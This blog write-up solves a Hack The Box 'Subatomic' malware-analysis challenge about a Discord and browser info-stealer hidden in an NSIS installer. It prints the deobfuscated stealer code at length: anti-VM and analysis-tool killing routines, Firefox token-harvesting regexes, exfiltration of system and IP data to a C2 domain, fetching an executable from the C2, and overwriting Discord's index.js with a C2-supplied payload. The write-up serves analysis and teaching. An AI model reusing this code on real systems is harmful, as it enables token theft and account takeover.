---
title: "Hack-The-Box : 'Subatomic'  Sherlock challenge writeup"
date: 2026-06-24 19:15:00 +0000
categories: [Writeups, Malware Analysis]
tags: [windows-internals, malware-dev, malware-analysis, reverse-engineering, malware-CTF]
description: "solving a medium malware analysis challenge from hack the box"
image:
  path: /assets/images/writeups/malware-analysis/Subatomic/Subatomic-logo.png
  alt: "Sherlock challenge writeup"
---

> Hi, I'm **Zane Bilal** — a computer science student and explorer of the offensive side of cybersecurity. This blog is where I share my journey through CTF challenges, Hack The Box sherlocks, and anything that sharpens my skills, I hope my writeups help you learn something new. Happy hacking! 


# Sherlock Scenario
Forela is in need of your assistance. They were informed by an employee that their Discord account had been used to send a message with a link to a file they suspect is malware. The message read: "Hi! I've been working on a new game I think you may be interested in it. It combines a number of games we like to play together, check it out!". The Forela user has tried to secure their Discord account, but somehow the messages keep being sent. They need your help to understand this malware and regain control of their account!

Warning:

This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments.

Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

# Solving the challenge
first we are provided with a zip file `Subatomic.zip` with the password provided from htb `hacktheblue` , we unzip it using powershell or any tool you like reviles two files (a text file and a zipped file that contains the malware ) 

![unzipping the file ](/assets/images/writeups/malware-analysis/Subatomic/unzipping-file.png)

let's read the content of the `DANGER.txt` file , as shown in the image bellow , the file contains a safety note about the content of the malware.zip file and some recommendation before running the malware

![ safety note from the danger.txt file ](/assets/images/writeups/malware-analysis/Subatomic/safety-note.png)

now after reading the note , let's unzip the malware.zip file with the provided password from the note  , with this we get an executable file with the name `nsis-installer.exe` (as shown in the image )

![ the file type of the unzipped sample ](/assets/images/writeups/malware-analysis/Subatomic/file-type.png)

we see that it is Nullsoft Installer self-extracting archive which is a file contains other compressed files and installation scripts. if we run it, it will extract the file , with this in mind we can tell this is a packed file 

## Check PE properties:
navigating to the properties tab of the PE file and in the digital signature tab we can see that the signature of this file is not valid which means the hash in the signature doesn’t match the hash of the file.

![ the file digital signature  ](/assets/images/writeups/malware-analysis/Subatomic/digital-signature.png)


we click advanced and we can see some bytes are not authenticated and this is indicated by the `unauthenticated attributes` field this means there is some additional data that was not included when the signing process happened

![ the unauthenticated data ](/assets/images/writeups/malware-analysis/Subatomic/unauthenticated-data.png)

my theory about this i can assume that the malware author stole a legitimate signature from a legit program and adds it to its malware to make it looks as legit as possible which is a common way used to bypass static detection and signature verification


## What is the Imphash of this malware installer?
###### First what is Imphash ?
ImpHash (Import Hash) is a special hash that hashes the list of imported Windows API functions used by a PE Instead of hashing the entire file contents like other algorithm does .the ImpHash is calculated from this ordered import list, not from the executable's bytes which makes different files can have The same ImpHash if they import the same APIs in the same order..  nice explanation about this hash in this link (https://youtu.be/fWV8Dh_RBZU) and let's back to our challenge.

there is many ways to get the Imphash hash of the file and the easiest one is using virustotal , but first we get the sha256 hash of the file and search it in virustotal  

![ Imphash of the file from virustotal ](/assets/images/writeups/malware-analysis/Subatomic/Imphash.png)


in the details tab we get get the Imphash of the binary 
another way to get the Imphash is using a python script , we can calculate it just with a few of lines of python as seen in the image 

```powershell

>>> import pefile
>>> pe = pefile.PE('nsis-installer.exe')
>>> pe.get_imphash()
'b34f154ec913d2d2c435cbd644e91687'

```

## The malware contains a digital signature. What is the program name specified in the SpcSpOpusInfo Data Structure?

`SpcSpOpusInfo` is a    
The easiest way to see this kind of data is though VirusTotal, but it can also be done with Python. The Signify(https://signify.readthedocs.io/en/latest/authenticode.html) Python package has a way to do this, and it’s on the examples page (this is in a Python console, but could also just write a script):

![ the program name specified in the SpcSpOpusInfo Data Structure using python ](/assets/images/writeups/malware-analysis/Subatomic/SpcSpOpusInfo-DS-from-python.png)


and from the Signature Info section at Virus Total we can see information under `SpcSpOpusInfo` it is clear the program name is Windows Update Assistant.

![ the program name specified in the SpcSpOpusInfo Data Structure from virustotal ](/assets/images/writeups/malware-analysis/Subatomic/SpcSpOpusInfo-DS-from-virustotal.png)


## The malware uses a unique GUID during installation, what is this GUID?
after unpacking the file which is a "Nullsoft Installer self-extracting archive"  which is simply a Zip file with some scripts that knows what to pull out of the archive, where to put it, and what to run once it’s unpacked. we can see a lot of unpacked files which are part of the Nullsoft installer, but the one that catch the eye is `app-32.7z` file because it is located in `$PLUGINSDIR` directory which is a temporary directory created and used by NSIS when an installer runs , It is used to extract and store temporary files, such as plugins, resources, or payloads required during the installation 
process. so this increase the probabilities of our file  `app-32.7z` to be a malicious sample.

![ unpacking the nsis-installer.exe file ](/assets/images/writeups/malware-analysis/Subatomic/unpacking-file.png)


another eyes catching file is the `[NSIS].nsi` file because it contains the installation instructions of the binary. Knowing this, the unique GUID used by the malware for installation process can be found there. To review it we can simply open it on any text editor.
reading couple lines of code i noticed there are a lot of functions that interact with the registry like `ReadRegStr` and `WriteRegStr` and there are several keys that reference to GUID `cfbc383d-9aa0-5771-9485-7b806e8442d5` which used in the installation and uninstallation of the program

![ some line that uses the GUID ](/assets/images/writeups/malware-analysis/Subatomic/GUID.png)


## The malware contains a package.json file with metadata associated with it. What is the 'License' tied to this malware?
now we need to extract the other malicious zip file `app-32.7z`, and we get several binaries that worth investigating , i wil start with the file with the "asar" extension in the resource folder , first we list all the files and directories contained within an `app.asar` archive using the command `asar l app.asar` in powershell 

![ files inside the app.asar  ](/assets/images/writeups/malware-analysis/Subatomic/list-folders-in-asar-app.png)

we can see there is several files but we are interested in the `package.json` file located in the root directory , extracting the file with the command `asar e .\extracted_app32\resources\app.asar .\extracted_files\` using powershell and reading the `package.json` file's metadata  we can see the License of this malware 
```json
{
  "name": "SerenityTherapyInstaller",
  "version": "1.0.0",
  "main": "app.js",
  "nodeVersion": "system",
  "bin": "app.js",
  "author": "SerenityTherapyInstaller Inc",
  "license": "ISC",
  "dependencies": {
    "@primno/dpapi": "1.1.1",
    "node-addon-api": "^7.0.0",
    "sqlite3": "^5.1.6",
    "systeminformation": "^5.21.22"
  }
}

```

## The malware connects back to a C2 address during execution. What is the domain used for C2?

if we open the `app.js` file we can see it contains obfuscated lines that does not make sense and we need to deobfuscated it, for this we need to do some dynamic analysis of the sample by debugging it with VScode 

![ obfuscated js code  ](/assets/images/writeups/malware-analysis/Subatomic/obfuscated-code.png)

in order to debug the js we need to install some dependencies using this two command 
```powershell

npm install @primno/dpapi
npm install sqlite3

```

now everything is set lets move to our vscode to debug the js code  
run the code and immediately press pause button in vscode and look to the call stack section we can see interesting things like the <eval> statement in the <anonymous> 

![ the call stack ](/assets/images/writeups/malware-analysis/Subatomic/call-stack.png)

now the code previous js code should be deobfuscated and when reviewing the code from <anonymous> i found an object named options which contains several keys, such as api, user_id, and logout_discord.

![the deobfuscated JavaScript code  ](/assets/images/writeups/malware-analysis/Subatomic/anonymous-code.png)

we There’s also imports at the top for the 3rd party packages and some configuration data , the `api` is likely the C2 server that’s in use, https://illitmagnetic.site/api which is our answer to the task 5 and 7, the domain used for C2 is `illitmagnetic.site`

## The malware attempts to get the public IP address of an infected system. What is the full URL used to retrieve this information?

Continue reviewing the deobfuscated script, i found the `newInjection` function which is mostly about collecting information about the infected computer to send back and in this function there is an object named networks which fetch to URL that is likely used to identify public IP information of the infected machine.

```js

async function newInjection() {
    const system_info = await si?.osInfo();
    const injections = await discordInjection();

    const network = await fetch('https://ipinfo.io/json', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const network_data = await network.json();

    fetch(options.api + 'new-injection', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            ram: Math.round(totalmem() / (1024 * 1024 * 1024)),
            cpu: cpus()?.[0]?.model,
            injections,
            distro: system_info?.distro,
            uptime: uptime() * 1000,
            network: {
                ip: network_data?.ip,
                country: network_data?.country,
                city: network_data?.city,
                region: network_data?.region,
            }
        })
    });
};

```

## The malware is looking for a particular path to connect back on. What is the full URL used for C2 of this malware?

the answer of this question is found in the option object on the `anonymous` function which is `https://illitmagnetic.site/api`

## The malware has a configured user_id which is sent to the C2 in the headers or body on every request. What is the key or variable name sent which contains the user_id value?

from the code we can see it 3 try /catch blocks and Based on the script , the first block calls three functions, those are checkVM(), checkCmdInstallation(), and newInjection(). The second block calls getDiscordTokens() function and the third block calls allBrowserData() function.

from `newInjection` which is mostly about collecting information about the infected computer to send back:

```js
async function newInjection() {
    const system_info = await si?.osInfo();
    const injections = await discordInjection();

    const network = await fetch('https://ipinfo.io/json', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const network_data = await network.json();

    fetch(options.api + 'new-injection', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            ram: Math.round(totalmem() / (1024 * 1024 * 1024)),
            cpu: cpus()?.[0]?.model,
            injections,
            distro: system_info?.distro,
            uptime: uptime() * 1000,
            network: {
                ip: network_data?.ip,
                country: network_data?.country,
                city: network_data?.city,
                region: network_data?.region,
            }
        })
    });
};

```
we can see At the top, it also makes a request to https://ipinfo.io/json, which returns information about the local computer’s public IP which is the answer of task 6 and When there’s POSTs of information to the C2, the user_id from the configuration is sent as the `duvet_id` which is our answer.



## The malware checks for a number of hostnames upon execution, and if any are found it will terminate. What hostname is it looking for that begins with arch?

from the `checkVM` function , it is clear this function is used for Anti-debugging and anti-analysis checks , to check if the malware is been analyzed and if it is running in a vm7

```js

function checkVm() {
    if(Math.round(totalmem() / (1024 * 1024 * 1024)) < 2) process.exit(1);
    if([
        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb',
        'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r',
        'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj',
        'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS', 'aranmoo', 'kathlcox', 'rotembarne', 'bilawson', 'seanwalla', 'gugonzal', 'zachwood', 'theresap', 'joyedwar', 'richar', 'dburns', 'willipe'
    ].includes(hostname().toLowerCase())) process.exit(1);

    const tasks = execSync('tasklist');
    [
        'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
        'vmwareservice', 'vmwaretray', 'discordtokenprotector'
    ].forEach((task) => {
        if(tasks.includes(task))
        execSync(`taskkill /f /im ${task}.exe`);
    });
};

```

first it checks that the total memory is greater than 2GB and that the hostname isn’t in a specific list, exiting if either check fails. Then it loops over a list of malware analysis tools and if any are in the tasklist, it tries to kill that process. and we can see our answer The hostname that starts with “arch” is `archibaldpc`


## The malware looks for a number of processes when checking if it is running in a VM; however, the malware author has mistakenly made it check for the same process twice. What is the name of this process?

from the previous code-block, we can see number of processes checked by the malware to see if they are running in a VM.
Noticed the same process gets checked twice `vmwaretray`.

```js
const tasks = execSync('tasklist');
    [
        'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
        'vmwareservice', 'vmwaretray', 'discordtokenprotector'
    ].forEach((task) => {
        if(tasks.includes(task))
        execSync(`taskkill /f /im ${task}.exe`);
    });

```

## The malware has a special function which checks to see if C:\Windows\system32\cmd.exe exists. If it doesn't it will write a file from the C2 server to an unusual location on disk using the environment variable USERPROFILE. What is the location it will be written to?

we stay in the same code we can see there exist a function called `checkCmdInstallation` which is responcible for checking whether cmd.exe binary is available and update the environment's command processor path accordingly.
If the cmd.exe binary is not exist, it will write a file from the C2 server to Document directory using the environment variable USERPROFILE.

```js
async function checkCmdInstallation() {
    return await new Promise(async(resolve) => {
        if(!existsSync('C:\\Windows\\system32\\cmd.exe')) {
            const request = await fetch(options.api + 'cmd-file', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'duvet_user': options?.user_id
                }
            });
    
            const response = await request.json();
            writeFileSync(join(process.env.USERPROFILE, 'Documents','cmd.exe'), Buffer.from(response?.buffer), {
                flag: 'w'
            });
            process.env.ComSpec = join(process.env.USERPROFILE, 'Documents', 'cmd.exe');
            resolve();
        } else {
            process.env.ComSpec = 'C:\\Windows\\system32\\cmd.exe';
            resolve();
        };
    });
};

```

and we can see the location to write to is `%USERPROFILE%\Documents\cmd.exe` which is our answer

## The malware appears to be targeting browsers as much as Discord. What command is run to locate Firefox cookies on the system?

by referring to the OUTLINE section, we can identify a function named getFirefoxCookies(), which used to steal cookies from firefox.

```js
async function stealFirefoxTokens() {
    const path = join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
    const tokens_list = [];

    if(existsSync(path)) {
        try {
            const files = execSync('where /r . *.sqlite', { cwd: path })?.toString()
            ?.split(/\r?\n/);
    
            files?.forEach((file) => {
                file = file?.trim();
                if(existsSync(file) && statSync(file)?.isFile()) {
                    const lines = readFileSync(file, 'utf8')
                    ?.split('\n')?.map(x => x?.trim());
    
                    for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                        lines?.forEach((line) => {
                            const tokens = line?.match(regex);
                            if(tokens) {
                                tokens?.forEach((token) => {
                                    if (
                                        !token?.startsWith('NzY') &&
                                        !token?.startsWith('NDk') &&
                                        !token?.startsWith('MTg') &&
                                        !token?.startsWith('MjI') &&
                                        !token?.startsWith('MzM') &&
                                        !token?.startsWith('NDU') &&
                                        !token?.startsWith('NTE') &&
                                        !token?.startsWith('NjU') &&
                                        !token?.startsWith('NzM') &&
                                        !token?.startsWith('ODA') &&
                                        !token?.startsWith('OTk') &&
                                        !token?.startsWith('MTA') &&
                                        !token?.startsWith('MTE')
                                      ) return;
                                      if(!tokens_list?.find((t) => t?.token === token)) {
                                        tokens_list?.push({
                                            token: token,
                                            found_in: 'Firefox'
                                        });
                                      }
                                });
                            };
                        });
                    };
                };
            });
        } catch(e) {
            console.log(e);
        };

    return tokens_list;
   };
};

```

from the function above we can see It uses `where /r . *.sqlite` to find SQLite DBs and then uses regex to look for tokens in the binary files. Afterwards, if the file is found then it collects all the data from the DB, then return it.


## To finally eradicate the malware, Forela needs you to find out what Discord module has been modified by the malware so they can clean it up. What is the Discord module infected by this malware, and what's the name of the infected file?

To identify what Discord module has been modified by the malware, we need to review all functions related to Discord.
Referring to the OUTLINE section, we can identify several functions related to Discord, those are: `discordInjection` and `newInjection`.

we can see the `discordInjection` is called from newInjection , in the first of the three blocks of main code. It loops over three folders in the AppData directory, Discord, DiscordCanary, and DiscordPTB:

```js

async function discordInjection() {
    const infectedDiscords = [];

    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
    ?.forEach(async(dir) => {
        if(existsSync(dir)) {
            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
            
            if(discord_index) infectedDiscords?.push(
                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
            );

            const request = await fetch(options.api + 'injections', {
                method: 'GET',
                headers: {
                    duvet_user: options?.user_id,
                    logout_discord: options?.logout_discord
                }
            });

            const data = await request.json();

            writeFileSync(discord_index, data?.discord, {
                flag: 'w'
            });

            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                if(err) {};
            });
        };
    });

    return infectedDiscords;
};

```
for each directory if it exists, it looks for a folder starting with `app-` which correspond to specific Discord versions, hen constructs a path to the `discord_desktop_core-1` module folder, a common location for Discord's core functionality.

```js

// Find Discord App Version
if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');

```

If that exists, it adds it to the infectedDiscords list and requests a new replacement file from the C2, writing it over the original index.js file:

```js

  if(discord_index) infectedDiscords?.push(
                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
            );

            const request = await fetch(options.api + 'injections', {
                method: 'GET',
                headers: {
                    duvet_user: options?.user_id,
                    logout_discord: options?.logout_discord
                }
            });

            const data = await request.json();

            writeFileSync(discord_index, data?.discord, {
                flag: 'w'
            });

```

Then it kills and restarts the current discord process:

```js
await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                if(err) {};
            });
```

